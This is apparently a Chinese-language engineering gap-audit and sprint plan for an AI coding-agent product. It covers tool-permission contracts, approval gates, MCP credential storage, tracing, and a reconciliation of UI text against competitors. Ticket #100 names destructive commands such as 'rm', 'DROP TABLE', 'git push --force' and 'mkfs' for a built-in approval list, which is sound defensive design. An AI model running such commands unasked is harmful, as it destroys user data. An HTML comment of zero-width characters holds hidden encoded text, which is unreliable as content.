- **验收**:① `grep` 断言「自称唯一校验点」这句话不得再出现在一个 `beforeBuildCommand` 为空的配置旁边(可写一条小门);② `docs/MULTI_END.md` 与 `tauri.conf.json`、`package.json` 三者对桌面端形态的描述**逐字一致**;③ 若选 B,断网真机跑一次桌面端并留证据。

---

### I 组 · 契约与引擎一致性(99–104)

---

**#99 🔴 P0 · 工具契约层「类型有定义、运行时零落地」**

- **现况(E1)**:`packages/types/src/tool-contract.ts` 定义了 `TOOL_EFFECT_SCOPES`(7 档,`:36`)、`TOOL_RISK_LEVELS`(`:173`)、`ToolPermissionContract`(`:188`)、`ToolResultBudgetContract`(`:216`)。但服务端 `MCPTool` dataclass 只有三字段 `name/description/input_schema`(`apps/ai-service/app/services/mcp_server.py:612-617`),CLI 侧仓内自证 `apps/cli/src/tools/**` 里 `effectScope` **出现 0 次**(`commands/spec-drift.ts:573`)。
- **后果**:权限判定与审批只能靠**工具名 + dangerLevel 兜底**,而 #92 的结构化摘要、§「发给 provider 的 function parameters 必须由校验面单向投影」(A13)、守门 111/113/115 全都建在这份契约上。**地基在类型层存在,在运行时不存在。**
- **方案**:① `MCPTool` 增字段(`effect_scopes`/`risk_level`/`result_budget`),默认值取**最保守档**并登记「未声明 ⇒ 按保守处理」的迁移期;② 90 个工具逐个补声明(可按族批量,但**每族首个人工核**);③ 把守门 111(`check-tool-contract-declared.mjs`)的判据从「有没有声明文件」升级为「声明是否被运行时消费」(与守门 121 的消费者判据同形)。
- **验收**:① `MCPTool(` 构造点必须全部带三新字段(grep 计数对账);② 把一个工具的 `effect_scopes` 改成错误值,审批门行为必须跟着变(**行为断言,不是文本断言** —— 承「判序要求只能用行为断言钉」);③ 存量按棘轮,先清偿再收紧(§12e 同型)。

---

**#100 🔴 P0 · 高危工具清单默认为空 ⇒ 「高危逐条审批」在默认部署下没有静态依据**

- **现况(E1)**:`_high_risk_tools_from_env()`(`agent_loop_v2.py:288-296`)只从 env `TOOL_APPROVAL_HIGH_RISK_TOOLS` 读取,**未配置时返回 `frozenset()`**;`TOOL_APPROVAL_ENABLED` 默认 true(`:277`)。即「审批开关是开的,但高危清单是空的」。
- **差距**:竞品的高危面是**内置**的(Trae 的 `deleteToolApproval`/`shellFileProtection` 场景规则、Codex 对 `.git`/`.codex`/`.agents` 强制只读、CodeBuddy 的删除进回收站 + 批量阈值默认 500 确认)。我方把它做成了一个「不配就等于没有」的开关。
- **方案**:给一份**内置默认高危集**(至少含:删除类、`run_command` 中含 `rm`/`DROP TABLE`/`git push --force`/`mkfs`、跨账号写、外部网络带凭据),env 只做**追加**不做**替换**;与 #99 的 `TOOL_RISK_LEVELS` 同源(清单从契约推导,不再手写名字表 —— 承 §4「豁免清单必然腐烂」)。
- **验收**:① 不设任何 env 时跑一次删除操作必须触发审批(阳性对照);② 默认集与 `TOOL_RISK_LEVELS` 的映射有一处唯一实现;③ 新增默认高危必须走票面评审(它改变行为,属 §24 确认项)。

---

**#101 🟡 P1 · 主循环轮次上限四个默认值,且没有任何尺子看它**

- **现况(E1)**:`AgentLoopV2` ctor `max_iterations=10`(`agent_loop_v2.py:1480`)、engine 线程默认 8(`agent_engine.py:2334,2551`)、settings 8(`core/config.py:64`)、CLI `maxIterations: 25`(`apps/cli/src/config/defaults.ts:17`)。而 doom-loop 那族参数已有 `scripts/check-doom-loop-parity.mjs` 钉死(P1 十个键两侧逐项等值),**轮次上限一个键都没进任何门**。
- **另**:`agent_loop.py` 的 V1 仍在生产被引用(3 处,见 §一.1),V3 #47 的「归一」剩这一口。
- **方案**:① 轮次上限并入现有 `check-doom-loop-parity` 的键集(同族参数、同一把尺子,不另立门);② 跨语言用同一份「上限语义」定义(默认值不一致必须显式声明理由,如 CLI 面向长任务所以更高),否则红;③ V1 出口壳:要么真归一(把 3 处引用改指 V2),要么在票面写清它承载什么 V2 不承载的东西。
- **验收**:① 改一侧默认值另一侧不跟着改,门必须红;② 报告里逐档列出实际生效值(不得只报「已对齐」)。

---

**#102 🟡 P1 · 子代理词汇双轨 + 状态词汇三域并存**

- **现况(E1)**:CLI persona 5 个(`researcher/coder/reviewer/planner/general`,`apps/cli/src/personas/contracts.ts`)与服务端 `dispatch_subagent` 的 5 个命名 agent(`code-reviewer/bug-fixer/feature-planner/test-writer/refactorer`,`mcp_server.py:8393`)**零映射**。状态词汇三套:`AGENT_TASK_STATUSES` 六态(`packages/types/src/agent-runtime.ts:1215`)、第二域四态(`:1234`)、`BgAgentStatus` 且拼 `cancelled`(`:1483`),文档自认「三域不同名无映射」。守门 151 已管住六态那一族并钉了「第二域不相交」,**另两族仍在**。
- **差距**:用户在 web 上派一个子代理,与在 CLI 里派,**看到的是两套名字、状态语义还不通**;Qoder Experts / CodeBuddy SubAgents / Codex `/subagents` 都是**一套词汇贯通**且可自定义角色(E3)。
- **方案**:① 角色别名表唯一源(放 `packages/types`,服务端与 CLI 都从它投影);② 三域状态各自保留但必须**登记域**并给出映射(不许「同一屏混排两种状态词」);③ 扩守门 151 到 persona 面(它已有「第二域不相交」的框架,天然支持加第三族)。
- **验收**:① 同一角色名在两端的 UI 显示逐字相同;② 摘掉别名表任一侧成员,门必须红;③ 扩族必须同批给消费方(与守门 77「新增角色档必须同笔有消费方」同规矩)。

---

**#103 🟡 P1 · MCP 凭据明文落文件,与本仓既有密钥纪律不成体系**

- **现况(E1)**:`apps/cli/src/tools/mcp-credentials.ts:25 getCredentialsPath()` 把 MCP OAuth 凭据写到文件路径;而 §5d 对模型密钥的纪律是「唯一权威来源在百度网盘同步目录、`.env` 由 gitignore 永不入库、输出恒脱敏」,§26 还专门管到 C 盘残留。MCP 凭据这一族**游离在纪律之外**。
- **竞品基线(E3)**:Qoder Cloud Agents 有 `vaults`;Trae/CodeBuddy 走云托管 OAuth。即竞品也把凭据当独立治理面。
- **方案**:① 优先接 OS 钥匙串(Windows Credential Manager),文件路径只作**非 win32 或钥匙串不可用时的显式降级**,降级时必须大声警告并在 `--capabilities` 里报出落点;② 纳入守门 67(凭据外泄)与 107(第三方来源台账)的射程;③ 与 §5e 的凭据健康巡检同批(它已有 `check-credential-health.mjs` 与 UNDELIVERED 机制)。
- **验收**:① 新建一条 MCP 授权后,盘上明文文件不存在或已被标记为降级(实测取);② 凭据内容不得出现在任何 stdout/日志行(阳性对照);③ 降级路径必须在文档写清并给退出码。

---

**#104 ⚪ P2 · 无可分布式追踪后端,跨四执行体拼不出一条链**

- **现况(E1)**:`core/trace_context.py`、`app/telemetry.py`、`core/tool_call_trace.py` 全自研;grep 未命中 OTel/LangFuse/Jaeger/Sentry 依赖。执行体有 web / api / ai-service / cli 四类(§「runtime-capability-disclosure」自己列的三类 + cli)。
- **竞品基线(E3)**:Codex 有 OTel 导出(含 chat、API 请求、SSE、**工具审批决策与结果**,prompt 默认脱敏);CodeBuddy 监控走 OTel(`cli/monitoring`)。
- **差距**:「为什么这一轮慢/为什么这次审批没弹」目前只能逐端翻日志;§5e 已把「到人」收成邮件单通道,但**内部链路**没有 trace。
- **方案**:先只做**一次对话轮的 trace id 贯通**(客户端生成 → api → ai-service → provider 调用记录 → SSE 帧回带),再谈 OTel 导出。**不做**全量 metrics 平台(超出对标必要范围)。
- **验收**:① 任一轮对话能拿 trace id 在日志里串起四段;② 脱敏:trace 属性不得含 prompt 原文与凭据(阳性对照,承 §5e「From 必须等于账号」那类「不满足就被拒」的实证习惯)。

---

### J 组 · 交付核验卫生(105)

---

**#105 🔴 P0 · 把「按代码判交付」做成常驻尺子(V3 §八 自留建议,至今未落地)**

- **现况(E1)**:`scripts/audit-benchmark-delivery.mjs` **不存在**(`ls` 实测)。V3 §八 原文:「本轮的核验脚本思路(用文件/符号级存在性而非台账勾选态判定交付)建议固化成一个 `scripts/audit-benchmark-delivery.mjs`,每轮对标时直接复用——**台账勾选态会滞后,以代码为准**」。
- **本轮实证它必要性**:V3 自己列的 #73(小程序无 AI 页)、#51(后台只有 sleep/echo)两条,今天都已被代码推翻;而 V3 文档正文与 PROJECT_PLAN 里**没有任何一处会喊「这条已过期」**。手工重验能抓到,是因为这轮恰好重读了它 —— 这不是防线,是运气。
- **方案**:① 输入 = 对标文档里的差距条目(每条带「判据锚」:文件路径 / 符号名 / 命令);② 逐条现读判 `已交付 / 仍存在 / 判不出`,**判不出必须点名原因**(文件不在面/符号改名/需运行时),不得计入「仍存在」也不得计入「已交付」;③ 输出即本轮 V4 §一.1 那种更正清单;④ 定级 **warn 且刻意不进提交链** —— 它判的是「文档与代码是否一致」,与本次提交内容无关,挂 blocking 就是恒红门(§12e);问责走 `pnpm check:benchmark-delivery`。
- **禁止**:`--update` 式把当前读数冻成基线(承 `check-plan-sha-resolvable.mjs` 那条「明令禁止」—— 那等于给腐烂发通行证)。
- **验收**:① 拿 V3 现文喂它,必须点名 #73/#51 两条为「已交付」(阳性对照,证明尺子真能读代码而不是读台账);② 构造一条假条目(指向不存在的符号),必须落「判不出」并点名原因,**不得落「仍存在」**(那是把「没看清」写成「有问题」);③ 反向:构造一条真存在的缺陷锚,必须落「仍存在」。

---

## 五、排期(续 V3 的 S1–S8)

排序原则沿用 V3:**先修「会误导的」,再修「不好用的」,最后做「拉开身位的」**。本轮另加一条本地原则:**先补尺子,再清存量** —— 否则 #93/#94/#96 这类「只在某端缺」的缺陷会继续在无人看守的格子里长。

| Sprint | 编号 | 交付形态 | 关键依赖与风险 |
| --- | --- | --- | --- |
| **S9 · 尺子先行(轻,但决定后四组能不能收敛)** | **105 → 97** | 交付核验尺子 + parity 门扩到六端(带端能力档案表) | 97 扩面必须同批改「枚举面 + 判据」两半(§4 教训);存量套棘轮,绝不造恒红门 |
| **S10 · 移动端可达性(重,用户可感最大落差)** | 93 → 94 → 95 | RN 主屏接线现成引擎 + 审批弹窗 + 共享屏二选一 | 95 的删/留决策要 §7 删除安全三问;**不得两份都留**;需真机取证,不接受只跑 typecheck |
| **S11 · 对话流保真** | 87 → 88 → 89 → 92 | 用户消息渲染 + 推理档位贯通 + 断线重连与状态条 + 工具参数结构化摘要 | 88 需先定 capability matrix 的置灰口径;92 依赖 99 的 effect scope,可先做「命令/删除」两族 |
| **S12 · 契约地基** | 99 → 100 → 101 → 102 | 契约字段落地 + 内置高危集 + 轮次上限进尺子 + 子代理词汇归一 | **100 改变默认行为**(属 §24 确认项,开工前需用户点头);99 是 92 的前置 |
| **S13 · 传输与计量收口** | 96 → 90 → 91 → 103 → 98 | 小程序走共享工厂传输 + usage 判别成员 + 双族登记 + MCP 凭据治理 + 桌面端口径对齐 | 96 动传输层,爆炸半径大,必须先有 90/91 的类型地基;**98 只对齐口径,不改架构选型** |
| **P2 后置** | 104 | trace id 贯通 | 不与上述抢资源 |

**并行冲突提示**(承 V3):① 每 Sprint 开工前跑 `git status` + `node scripts/check-task-claims.mjs`,认领用 `- [ ]（进行中@日期/持有者）`;② 涉及 SSE 契约必须过 `check-agent-event-parity.mjs`(本轮 97 扩面后是六端);③ 涉及 i18n 过 `check-i18n-keys` + `scan-dead-i18n-keys`,**且新增状态词必须五语言同批**(AGENTS §30);④ 跨端事件取证**先查网关层 `apps/api`**(V3 记录的 budget 帧两次翻案共同根因)。

---

## 六、验收与防回潮

**通用验收基线**(沿用 V2/V3 并加严三条):

1. 每项须有单测或 e2e;**命戒指变异验证**(刻意改坏行为确认测试会红)。
2. 涉及 UI 的须五语言 parity + 零死 key。
3. **本轮新增:「组件存在」与「组件上屏」是两件事。** 凡本轮交付的 UI 件,验收必须断言**生产面 importer ≥1 且排除测试面**;`connection-status.tsx` 那种「只有测试引用」不得算交付(本仓已为 64/70/81/115/138 记过同型)。
4. **本轮新增:跨端项必须逐端取证。** #93/#94 不接受「web 绿了」当结论,须真机/真小程序各留一张截图或一段 DOM/computed 值证据(§17 的 4 状态自验纪律)。
5. **本轮新增:改被审代码的写法必须同时改审它的正则。** #99/#100 会改 `MCPTool` 构造形态与审批清单来源,那些正则/判据在守门 111/113/67 里 —— 不同批改,就是把 blocking 升级签发给一台瞎掉的尺子(守门 117 的实录教训)。
6. 三端 `tsc` / `eslint` / `ruff` / `mypy` 零新增错误。

**建议新增的三把尺子**(落地时按 §「登记新门前先查编号占用」取号,编号一律以 `scripts/guardian-runner.mjs` 现值为准,**不得照本文数字派单**):

| 建议脚本 | 断言 | 防的是哪一条回潮 |
| --- | --- | --- |
| `scripts/audit-benchmark-delivery.mjs` | 对标条目按代码现读判三态(已交付/仍存在/**判不出**),判不出不得并入另两桶 | #105;以及 V3 #73/#51 这类「文档已过期而账面不知情」 |
| `scripts/check-stream-callback-coverage.mjs` | 各端 `streamChat` 调用点覆盖的回调集合必须 ⊇ 该端能力档案声明集;档案里每条须带 reason + until | #93 / #94 / #96;把「多端连通」从散文变成判据 |
| `scripts/check-tool-effect-declared.mjs`(或直接扩守门 111) | 运行时工具对象的 effect scope / risk level 非空,且**被审批路径真的读到**(行为断言) | #99 / #100 / #92 的地基 |

**孤儿件卫生**(承 V3 §七 规矩:「全仓零消费者的组件/hook,要么接要么删,不允许留」):

- V3 已列且本轮复验**仍在**的孤儿:CLI `apps/cli/src/tui/mode-indicator.tsx`(`apps/cli/tsconfig.json:19` 的 `include` **至今仍是 `["src/**/*.ts"]`,不含 `.tsx`** ⇒ 永不编译,这条 V3 断言成立);`scripts/ensure-web-out.mjs`(见 #98,本轮升级为「三处口径互斥」)。
- **本轮新增孤儿清单**(逐条 `git grep` 复验,生产面零挂载,仅测试或注释引用):
  - `apps/web/src/components/ai/progress-sections/connection-status.tsx` → 归 #89 接上
  - `apps/web/src/components/ai/model-load-bar.tsx`、`cloud-chat-ops-card.tsx`、`connector-auth-card.tsx`、`edit-resend-rollback-confirm.tsx`、`move-to-worktree-dialog.tsx`、`annotation-anchor-label.tsx`
  - `apps/web/src/components/chat/input-notice-banner.tsx`、`input-source-cards.tsx`、`writing-block.tsx`
  - ~~`apps/web/src/components/chat/voice-note.tsx`~~ —— **调研初稿点名后本人复量否证**:`git cat-file -e HEAD:<该路径>` 与 `git ls-files` 双双落空,它只躺在**工作树未跟踪面**(同目录另有已入库的 `voice-input.tsx`/`voice-record.tsx`/`voice-stream-speaker.tsx`/`voice-toolbar.tsx`)。未入库的文件不构成「已入库孤儿」,且归属未定 ⇒ 按 §12 **不动不删**,只登记事实。
  - `apps/web/src/components/ai/chat-search-bar.tsx`(其邻居注释自称「孤儿件已删除」而文件仍在 —— **注释与磁盘不符,登记为文档失真一条**)
  - `packages/shared/src/chat/render-model.ts` 的 `buildRenderModel`:全仓**仅 extension 一个消费方**(`apps/extension/entrypoints/sidepanel/components/MessageContent.tsx:737`),web 另写投影 ⇒ 共享抽象事实上只服务一端,归 #91 处理
  - `packages/app/src/features/chat/ChatScreen.tsx` → 归 #95
- 处置纪律:每条要么在本轮某个 Sprint 里接上,要么按 §7 删除安全三问走「先迁后删」;**不得只登记不处置**,那正是本清单要反对的状态。

---

## 七、与前三轮的关系

- **V1(1–14)** 解决「主链路有无」。**V2(15–36)** 解决「对话流元素粒度」。**V3(47–86)** 解决「能力是否真实存在并真的在跑」。
- **V4(87–105)** 解决 **「能力真的在跑,但用户看不见 / 只有一端看得见 / 看见了但不保真」**。三轮下来的失效型高度一致:**能力在类型层存在、在运行时缺席、在某一个端沉默。**
- **本轮主动更正三件事**(写下来是为了让下一个人不必重新猜):V3 #73 与 #51 已不成立;#47 应为「一套半」;`packages/app` 的 `ChatScreen` 是「导出在位、零消费方」而非「未导出」;web **有**队列与 Steer(D38 已✅),不是差距。
- **未闭环且如实登记**:① #100 会改变默认行为,按 §24 需用户拍板后才开工;② #98 的架构选型(V3 #72 已定「保留薄壳」)不在本轮改动范围,只对齐口径;③ 本文所有数字(30/7/23/90/16 等)均为 2026-09-28 现读,**派单前必须重跑命令取现值**,不得照抄。
<!-- ⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠ -->

---

## 八、第五轮追加：逐族对账（一手取证物已入库 `docs/benchmark-evidence/2026-09/`）

> §一–§七 是「缺失项清单」，本节是**逐族条数与原文对账**——回答"到底差在哪一层"。
> 取证面：Qoder CN `v0.4.3` 的 renderer bundle 内嵌 zh 段（4,899 行清单，键名+原文+出处三列齐）；
> 并新增一个取证维度：**读竞品真实渲染的窗口元素树**（`get_window_state` 只读，实测 `nodeCount 220`）。

### 8.1 新增取证维度：实况界面树（比包内字面量更硬）

从运行中的 Qoder CN 窗口树直接读到、且**包内字符串取证没拿到**的实况元素：
`工作模式切换`（编程 / 通用两枚切换按钮）、`折叠工作目录 IHUI-AI` + `IHUI-AI 更多工作目录操作` + `在 IHUI-AI 中新建任务`（**多工作目录确实渲染出来了，加强 §五 那条**）、每枚任务旁的 `状态 任务正在进行`、`按钮 查看我的用量`、`切换按钮 隐藏任务监控`、`组 面板组按钮`（打开终端面板 / 打开侧边栏）、`按钮 添加 Workspace Action`、侧栏四入口 `知识中心 / 站点 / 自动化 / 扩展`、`缩略图 调整侧导航宽度 Value: "13.051"`。
**规矩**：包内字面量只能证明"这段文案存在"，不能证明"它在当前版本真的显示"；反之窗口树只证明当前屏幕，不覆盖未到达的状态。两把尺子都要用，**不得互相冒充**。

### 8.2 逐族条数对账（竞品条数 = 清单实测；我方条数 = zh-CN 语言包同族键实测）

| 族 | Qoder 原文条数 | 我方条数 | 判定 |
| --- | --- | --- | --- |
| `attention.*`（待我处理事项） | 26 | 部分（`conversation-attention.test.tsx` 实测存在 `attentionWaiting` / `attentionUnread` / `batchAttentionSummary`） | **不是整族缺失**，缺的是决策信息字段（见 8.3①） |
| `chatQueue.*`（排队·插话·打断并执行） | 33（steer 族 12 + interruptAndRun 族 9 + 队列基元 12） | 12 | **缺"动作为什么现在不能按"这一子类**（见 8.3②） |
| `chatActivity.fileChanges.*`（撤销全链路） | 35 | 无对应失败声明 | 见 8.3③ |
| `chatActivity.fileChanges.diffPreview*` | 5 态 | 3 态（D90 已✅） | 竞品多"已过期""过大"两态，且每态给**动作** |
| `browserAnnotation.*`（网页元素/区域标注） | 35 | 组件在库但**生产面零挂载**（D149 已登记） | 通道与挂载双缺 |

### 8.3 三条本轮新确证的细粒度差距（各附竞品原文与我方否证）

**① 审批卡缺四个"决策信息字段"。** Qoder 原文：`attention.whyNow:"为什么现在"`、`attention.whyYou:"为什么找我"`、`attention.reversibility:"可逆性"`、`attention.afterDecision:"决定后"`，另配准入声明 `attention.description:"只有无法继续推进的判断、请求和最终验收会出现在这里。"` 与空态 `attention.emptyDescription:"Agent 可以继续工作，没有任务正在等待你的判断。"`，还有出口 `attention.openContext:"在上下文中处理"` + `attention.contextReady:"原始任务、执行轮次和相关证据保持在同一上下文中"`。
**我方否证**：`git grep -niE "为什么我|可逆|reversib|whyYou|决定后|afterDecision" -- packages/i18n/messages packages/shared/src apps/web/src` 命中**全是代码注释与测试标题**，无一条是界面文案。
**为什么这一族值钱**：它把"要不要批准"从**风险标签**升级为**决策依据**——用户看到的不是"这条命令危险"，而是"为什么现在必须我判断、我能撤销吗、批准后会发生什么、想细看能不能跳回上下文"。我方 D158（缺放行规则）与本条同属审批面但**动作不同**，不得互顶。

**② 队列三个动作缺「不可用原因」子类（最可实施的一条）。** Qoder 原文成对出现，动作名 + 每一种不可用的原因各一条：`steerUnsupportedTip:"当前 Runtime 不支持插话，消息将继续排队"`、`steerInactiveTip:"当前没有运行中的 Turn，消息将继续排队"`、`steerWaitingTip:"先处理 Agent 正在等待的请求，再发送插话"`、`steerControlCommandTip:"压缩上下文会在当前 Turn 完成后执行，不能插入正在运行的 Turn"`、`steerQueueChangedTip:"排队消息已发生变化，请确认当前队列"`、`steerDeferred:"未发送插话"` / `steerFailed:"无法发送插话"`（**区分"没做"与"失败"**）；`interruptAndRun` 同构 7 条，另有竞态声明 `interruptAndRunQueueChangedTip` 与来源不符 `interruptAndRunSourceMismatchTip:"这不是语音 Agent 委派的任务，将继续按普通任务处理"`。键盘可达性也给了：`dragTip:"拖动调整排队顺序；聚焦后可使用上下方向键"`。
**我方现状**：zh-CN 同族 12 条，且**已覆盖动作语义**（`steer:"立即引导(当前工具完成后生效)"`、`queueAhead:"前面的消息尚未处理完成，正在按顺序等待"`）——所以差距不是"没做队列"，是**按钮灰着的时候不说为什么**，以及"未发送"与"失败"不分。D38 已✅的五动词与本条不重叠：**五动词是能力，这 6–7 条拒因是诚实性**。

**③ 撤销失败必须声明「工作区未发生变化」。** Qoder 原文：`undoUnavailableDescription:"文件检查点不可用，工作区未发生变化。"`、`undoFailedDescription:"CLI 文件检查点暂时不可用，工作区未发生变化。"`、`undoSucceededDescription:"已恢复 {{count}} 个文件；任务记录仍然保留。"`（连"记录不会被删"都明说）、确认态 `undoConfirmDescription:"将恢复 {{fileCount}} 个文件，并同时撤销从这轮开始受影响的 {{turnCount}} 轮修改。任务记录不会删除。"`、准备态 `undoPreparingDescription:"正在检查将恢复的文件和受影响轮次…"`。
**我方否证**：`git grep -niE "工作区未发生|未发生变化|nothing changed" -- packages/i18n/messages/web/zh-CN.json apps/web/src packages/shared/src` **零命中**。
**为什么重要**：回退是**破坏性动作**，用户决定是否再试一次，靠的正是"这次没改成任何东西"这句承诺。它与 §五「协议通道①：越权用例要断言副作用未发生」是同一条纪律的**用户界面版**——机器侧要断言 `whereSeen===0`，人这一侧要给一句"什么都没变"。

### 8.4 本节方法论增量（写进 D160 的拆票规矩）

本轮把"一类 × 一端"再收紧成**「一族 × 一个动作 × 它的全部不可用原因」**：只有这个粒度才能问出"按钮灰着说不说清为什么"这种问题；宽题（16 类 × 6 端）在本仓实测两次撞 maxTurns=150、烧掉上千万 token 而无结论。派单时**必须同时要求两把尺子**（包内字面量 + 真实窗口树），并禁止把其中一把的绿灯当成另一把的结论。

---

## 九、第五节逐条对账（§10 / §14 / 附录 C·D·E，共 1,197 条判定）

工具：`docs/benchmark-evidence/2026-09/reconcile.mjs`（四态匹配器，逐条导出 `reconcile-*.md` 共 5 份、160KB，均入库可复核）。
口径：**L1 逐字 / L2 近义(Jaccard≥0.5) 不算差距；L3=需人工核；MISS=候选缺失**。我方语料 14,045 条语言包 value + 9,068 条 HEAD 面源码中文字面量（1,586 个 .ts/.tsx，走 `git cat-file --batch` 取 **HEAD 面**而非工作树，理由见 §9.3）。

### 9.1 五节逐条计数

| 节 | 条目 | L1 | L2 | L3 | MISS | skip(不计差距) |
| --- | --- | --- | --- | --- | --- | --- |
| §10 引用与来源 | 430 | 84 | 52 | 92 | **191** | 11 |
| §14 会话管理·分享·导出·侧栏 | 480 | 96 | 96 | 129 | **155** | 4 |
| 附录 C 组件内置默认文案 | 128 | 19 | 7 | 7 | **24** | 71 |
| 附录 D 错误码目录（87 条） | 87 | 10 | 11 | 25 | **41** | 0 |
| 附录 E 第二本错误目录（72 条） | 72 | 1 | 12 | 11 | **48** | 0 |
| 合计 | 1,197 | 210 | 178 | 264 | **459** | 86 |

> **本表是 D167 修复后的复量，不是首轮那一份。** 首轮读数为 `85/55/95/195`、`96/97/129/158`、`19/10/13/44`、`10/11/25/41`、`1/12/11/48`，合计 MISS **486**。
> 差出来的 27 条全在附录 C：那一族里混着 CSS 属性名与样式值（`flex`、`0 2rpx 8rpx` 这类），旧版没有"非中文原文"这一档，于是它们既不算命中也不算跳过，一路落进 MISS —— 更糟的是其中若干条被 Jaccard 判成 **L2**（例：`Ctrl+Shift+P` 命中了我方某条不相干文案），那是"找到了"，等于量具替我方发合格证。
> 修复同时处理了族归属：`## 节` 标题过去不清族，附录 D 的错误码行整批继承上一节族名（`tagPill` 因此虚到 87 行），**族级**聚合数字随之不可用；逐行判定不受影响。
> 判据由 `node docs/benchmark-evidence/2026-09/reconcile.mjs --self-test` 三条构造面用例钉住（ST1 换节清族 / ST2 非中文判 skip 且中文行不误伤 / ST3 语言包语料不得按磁盘读），三条在修复前实测 **0/3 通过**、修复后 3/3。


### 9.2 MISS 的假阳率是实测的，不是估计的

从 MISS 密集区取 5 条候选逐条按**原文语义**否证（不按族名、不按标识符），结果 **2 条是假阳**：`updates.*` 的"产品动态/更新公告"与 `feedback.*` 的"反馈表单带字数计数"我方**都有**，只是文案叫法不同；而 `composer.edit:"编辑此消息"` 我方对应值是 `"edit":"编辑"`——**同一条能力，逐字与 Jaccard 都不会命中**。
⇒ 假阳率 ≈ **40%（2/5）**。所以本轮**没有**把 MISS（修复后现读 459 条，修复前那版报 486）汇总成一条"我方缺 N 项"的结论，也不允许任何人这样引用本表；只有逐条否证过的才能进台账（本轮进台账 3 条，见 §9.4）。

### 9.3 量具本轮三次空转，全部被自己的守卫抓住（这一节是本轮最可复用的产出）

1. `git grep -E "\p{Han}"` 在 POSIX ERE 下**静默返回空**（不报错），导致"源码中文字面量"抓成 0 条，附录 C 的 MISS 一度虚高；现改为 `git cat-file --batch` 读 HEAD 面并在 `srcZh.size===0 && files.length>0` 时 **exit 2 拒绝出结论**。
2. `cat-file --batch` 漏了 `HEAD:` 前缀 ⇒ 1,586 个文件全部读空、仍然"跑成功"；同一条守卫抓住。
3. 脚本从子目录执行时 `-- apps/web/src` 按当前目录解析 ⇒ 清单 0 个文件；现一律 `-C ROOT`，且**空清单本身判死**（原先只防"抓到 0 条"没防"清单 0 个"，那一格是守卫自己的洞）。
另有两条**未修的已知缺陷**，引用本表数字时必须带上：① **族归属会跨块串行**——附录 D 的错误码行被贴上上一个 `###` 的族名（`tagPill` 90 条里混着 `102:请求时间校验失败`），所以 §9.1 的族级聚合**不可作为归因依据**，逐条原文与判定态才可信；② 非文案过滤按键名启发式，只摘掉 42 条，仍有 `dir:ltr`、`phase:idle` 一类枚举值漏在 MISS 里。**修法**已登记为票（见 D167）。

### 9.4 本节新确证的三条真差距（各附竞品原文与我方否证命令）

1. **速记板（Quick Notes）**——`chatSession.addToQuickNotes:"添加到速记板"`、`addedToQuickNotes:"已添加到速记板"`、`ariaLabel:"选中文本操作"`：把**选中的文本**（含代码块/错误/浏览器选区）暂存到一个跨轮次的板子上再一次性交给 Agent。我方否证：`git grep "速记\|quickNote" -- packages/i18n/messages/web/zh-CN.json packages/shared/src apps/web/src` 零命中。与 §五 D131（@ 引用无图片/知识库维度）同属"上下文投喂"这一维但**动作不同**：引用是"指向来源"，速记是"暂存片段"，不得互顶。
2. **会话分组管理**——`sidebarGroup.moveSessionAction:"移动到分组"`、`moveSelectedAction:"移动所选任务到分组"`、`pinError:"无法更改分组置顶状态"`：批量把会话归入分组、分组级置顶、**失败要给原因**。我方否证：`移动到分组\|分组置顶\|moveToGroup\|pinGroup` 零命中；我方侧栏实测有"文件夹/标签/批量"入口（`sidebar-chat-history.tsx:181/414`），缺的是**分组维度的动作与其失败态**，不是"没有分组功能"——这一区分必须写进票，否则会重做已有部分。
3. **输入链接时的链接预览卡**——`linkFileActions.previewLoading:"正在加载链接预览..."`、`previewUnavailable:"无法读取链接预览"`：粘贴 URL 后在发送**之前**给"能不能读、读到的是什么"。我方否证：`链接预览\|linkPreview\|previewUnavailable` 零命中；我方 `@` 支持 web 维度（`mention-engine.ts:67-196`）但**无预览态**，即"发出去之后才发现抓不到"。

### 9.5 加强一条已有票（不新开票）

`nav.*` 一族 33 条 MISS 中 `myWork:"需要我"` / `assigned:"分配给我"` / `needs:"由我决定"` 是 **D161（审批四字段）的导航级落点**：竞品把"等我判断"做进了侧栏一级导航而不只是弹层。D161 的射程因此要含"侧栏入口 + 计数"，不得只实现弹层里的四个字段。**这是同一条票的证据补强，不是新差距**——按 §1「一个编号只能有一行当前状态」，就地补进 D161 正文，不另立行。
## 十、实施级开发计划（七族 42 票，2026-09-28 起可派单）

**这一节怎么来的**：按族各派一名代理产出「每条票 8 栏」的实施级计划（目标行为 / 现状锚点 / 改动分解 / 受影响文件 / 跨端与 i18n / 验收判据 / 依赖与顺序 / 风险与回退），主代理负责跨族的排期、依赖图、退出闸与勘误（§十一）。派单时给每条族设了轮次与命令预算——上一轮有两个代理在 150 轮上限处零产出，所以这轮把预算写进任务书而不是靠代理自觉。

**读这份计划的三条规矩**：

1. 栏里标 `未取证:<原因>` 的地方**不是事实**，是"下一个人开工第一步要跑的命令"。本仓最高频的失效型是把没判写成判过了，所以宁可留白也不代填。
2. 标 **需 §24 拍板** 的票都附了**可直接批准的预填方案**（具体档位、清单、逐键中文文案），不是一道开放问题；批准即开工。
